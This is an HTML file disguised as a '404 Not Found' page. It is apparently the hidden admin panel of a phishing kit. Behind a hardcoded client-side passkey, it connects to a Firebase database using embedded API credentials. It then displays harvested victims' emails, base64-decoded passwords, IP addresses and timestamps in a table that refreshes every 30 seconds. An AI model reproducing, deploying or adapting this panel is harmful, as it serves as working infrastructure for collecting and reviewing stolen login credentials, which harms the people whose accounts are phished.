<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>404 Not Found</title>
    <meta name="robots" content="noindex, nofollow">
    
    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
    
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', monospace;
            background: #0a0a0a;
            color: #ff0000;
            min-height: 100vh;
        }
        #gate {
            background: #111;
            border: 2px solid #330000;
            padding: 30px;
            max-width: 400px;
            margin: 100px auto;
            text-align: center;
            border-radius: 10px;
        }
        #gate input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            background: #0a0a0a;
            border: 1px solid #330000;
            color: #ff0000;
            font-family: 'Courier New', monospace;
            font-size: 16px;
        }
        #gate button {
            width: 100%;
            padding: 12px;
            background: #330000;
            color: #ff0000;
            border: none;
            cursor: pointer;
            font-family: 'Courier New', monospace;
            font-size: 16px;
        }
        #panel { display: none; padding: 20px; }
        h1 { text-align: center; border-bottom: 2px solid #330000; padding-bottom: 15px; margin-bottom: 20px; }
        table {
            width: 100%;
            border-collapse: collapse;
            background: #111;
            border: 1px solid #330000;
        }
        th {
            background: #1a0000;
            color: #ff0000;
            padding: 12px;
            text-align: left;
        }
        td {
            padding: 10px 12px;
            border-bottom: 1px solid #1a1a1a;
            color: #ccc;
            font-size: 13px;
        }
        tr:hover { background: #1a0000; }
        .pass { color: #ff0000; font-weight: bold; }
        .refresh {
            background: #330000;
            color: #ff0000;
            border: 1px solid #660000;
            padding: 10px 20px;
            cursor: pointer;
            font-family: 'Courier New', monospace;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div id="gate">
        <h2>🩸 ACCESS DENIED</h2>
        <input type="password" id="key" placeholder="Passkey...">
        <button onclick="unlock()">Enter</button>
    </div>
    
    <div id="panel">
        <h1>🩸 LILITH ADMIN</h1>
        <button class="refresh" onclick="load()">🔄 Refresh</button>
        <div style="background:#111;border:1px solid #330000;padding:15px;border-radius:8px;margin:20px 0;text-align:center;">
            <span style="font-size:36px;font-weight:bold;" id="total">0</span>
            <span style="color:#666;font-size:12px;display:block;">TOTAL</span>
        </div>
        <table>
            <thead>
                <tr><th>#</th><th>Email</th><th>Password</th><th>IP</th><th>Time</th></tr>
            </thead>
            <tbody id="table"></tbody>
        </table>
    </div>

    <script>
        var _pass = 'lilith666';
        
        function unlock() {
            if (document.getElementById('key').value === _pass) {
                document.getElementById('gate').style.display = 'none';
                document.getElementById('panel').style.display = 'block';
                init();
            }
        }
        
        function init() {
            firebase.initializeApp({
                apiKey: "AIzaSyBs9TiMKOoMaIb84RVowQFrGlELAZ_SFSI",
                authDomain: "rhfzero-d95f5.firebaseapp.com",
                databaseURL: "https://rhfzero-d95f5-default-rtdb.firebaseio.com",
                projectId: "rhfzero-d95f5",
                storageBucket: "rhfzero-d95f5.firebasestorage.app",
                messagingSenderId: "198495096060",
                appId: "1:198495096060:web:d368e1531d0d86321f5b79"
            });
            window._db = firebase.database();
            load();
            setInterval(load, 30000);
        }
        
        function load() {
            if (!window._db) return;
            window._db.ref('x').on('value', function(s) {
                var d = s.val();
                var t = document.getElementById('table');
                if (!d) { t.innerHTML = '<tr><td colspan="5" style="text-align:center;color:#666;">Empty</td></tr>'; return; }
                
                var arr = Object.values(d).reverse();
                document.getElementById('total').textContent = arr.length;
                
                var h = '';
                arr.forEach(function(v, i) {
                    var e = '-', p = '-';
                    try { e = atob(v.u); } catch(x) { e = v.u || '-'; }
                    try { p = atob(v.k); } catch(x) { p = v.k || '-'; }
                    
                    h += '<tr><td>'+(i+1)+'</td><td>'+e+'</td><td class="pass">'+p+'</td><td>'+(v.i||'-')+'</td><td>'+(v.t||'-')+'</td></tr>';
                });
                t.innerHTML = h;
            });
        }
        
        document.getElementById('key').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') unlock();
        });
    </script>
</body>
</html>
